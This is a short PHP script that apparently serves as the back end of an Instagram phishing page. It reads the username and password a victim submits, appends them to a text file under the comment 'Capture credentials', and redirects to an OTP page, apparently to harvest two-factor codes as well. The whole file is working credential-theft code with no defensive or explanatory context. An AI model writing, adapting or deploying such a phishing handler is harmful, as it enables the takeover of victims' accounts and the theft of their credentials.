
<?php
// Capture credentials
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

// Redirect to OTP page for 2FA
header('Location: otp.html');
exit();
?>
